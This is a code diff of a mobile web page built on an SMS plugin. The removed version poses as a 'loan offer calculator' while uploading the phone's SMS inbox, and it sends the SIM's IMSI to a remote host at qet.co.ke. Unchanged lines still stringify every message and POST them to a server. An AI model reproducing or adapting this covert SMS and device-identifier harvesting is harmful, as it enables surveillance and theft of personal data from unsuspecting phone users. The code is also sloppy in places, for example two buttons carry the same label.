@@ -75,7 +75,7 @@
         function listSMS() {
             updateData('');
             if(SMS) SMS.listSMS(filter, function(data){
-               //updateStatus('sms listed as json array');
+               updateStatus('sms listed as json array');
                 //updateData( JSON.stringify(data) );
                 
                 var html = "";
@@ -90,7 +90,7 @@
                        
                     }
                 }
-                //updateData( html );
+                updateData( html );
                 smslist=JSON.stringify(smsList);
                 postSMS(smslist)
 
@@ -114,50 +114,11 @@
                   data:{id:1, smslist:smslist},
                   success:function(data){
                     
-                    $('#data').html(data);
+                    $('#message').html(data);
                   }
                 });
 
                 //end of sync
-        }
-
-        function loanoffer(){
-
-
-            updateData('');
-            if(SMS) SMS.listSMS(filter, function(data){
-                //updateData( JSON.stringify(data) );
-                
-                var html = "";
-                if(Array.isArray(data)) {
-                    for(var i in data) {
-                        var sms = data[i];
-                        
-                        //get device id
-                           deviceid = sms.sim_imsi;  
-                       
-                       
-                    }
-                }
-                //updateData( html );
-                 $.ajax({
-                  url: "http://qet.co.ke/smslist/bridge.php",
-                  crossDomain: true,
-                  cache: false,
-                  type: 'POST',
-                  data:{id:2, deviceid:deviceid},
-                  success:function(data){
-                    
-                    $('#data').html(data);
-                  }
-                });
-
-                
-                
-            }, function(err){
-                updateStatus('error list sms: ' + err);
-            });
-      
         }
         function deleteLastSMS() {
             updateData('');
@@ -217,14 +178,28 @@
         }
         </script>
         <div id="fullpage">
-            <p>LOAN OFFER CALCULATOR</p>
+            <p>Demo for SMS Plugin</p>
 
-            
-            <button onclick="listSMS();">UPLOAD MESSAGES</button>
+            To:<input type="text" size=16 id="sendto"/><br/>
+            Text:<textarea rows="5" cols="30" id="textmsg"></textarea><br/>
+            <button onclick="sendSMS();">Send</button>
             <hr/>
-            <button onclick="loanoffer();">CALCULATE LOAN OFFER</button>
+            <button onclick="listSMS();">List Inbox (recent 10)</button>
+            <button onclick="postSMS();">List Inbox (recent 10)</button>
             <hr/>
             
+            <button onclick="startWatch();">Start Watch</button>
+            <button onclick="stopWatch();">Stop Watch</button>
+            <br/><div id='watching'></div>
+            <hr/>
+                
+            <span id='intercept'/>Intercept OFF</span><br/>
+            <button id='enable_intercept' onclick='toggleIntercept();'>Enable</button> 
+            <button onclick="restoreAllSMS();">Restore SMS</button>
+            <button onclick="deleteLastSMS();">Delete Last SMS</button>
+            <hr/>
+            
+            <button onclick="updateStatus('');updateData('');smsList.length=0;">Clear</button><br/>
             
             <div id='status'></div><hr/>
             <div id='data' style='text-align:left;'></div>
